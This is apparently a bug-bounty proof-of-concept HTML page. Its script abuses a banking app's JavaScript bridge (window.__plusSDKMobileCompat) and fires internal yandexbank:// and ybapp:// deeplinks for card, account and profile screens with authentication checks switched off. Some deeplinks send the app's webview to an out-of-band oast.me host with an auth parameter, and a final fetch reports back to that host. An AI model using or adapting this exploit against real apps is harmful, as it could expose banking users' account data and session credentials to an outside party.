<html><head><title>PoC</title></head>
<body>
<script>
// Use OPEN_LINK with DEEPLINK type to trigger internal app actions
// These internal deeplinks might expose data or perform privileged actions

var deeplinks = [
  // Try to navigate to card details
  "yandexbank://screen.open/cards",
  "yandexbank://screen.open/card_details",
  "yandexbank://screen.open/account",
  "yandexbank://screen.open/profile",
  "yandexbank://screen.open/settings",

  // Try ybapp scheme (internal routing)
  "ybapp://screen.open/cards",
  "ybapp://screen.open/profile",
  "ybapp://screen.open/open_web?url=https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/deeplink-web&auth=yandex",
  "ybapp://deeplink/redirect?url=https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/deeplink-redirect",
];

deeplinks.forEach(function(dl, i) {
  setTimeout(function(){
    window.__plusSDKMobileCompat.onMessage(JSON.stringify({
      type: "OPEN_LINK",
      trackId: "dl" + i,
      payload: {
        url: dl,
        urlType: "DEEPLINK",
        openType: "IN",
        needAuth: false
      }
    }));
  }, i * 500);
});

fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/deeplinks-sent?count=" + deeplinks.length);
</script>
</body>
</html>
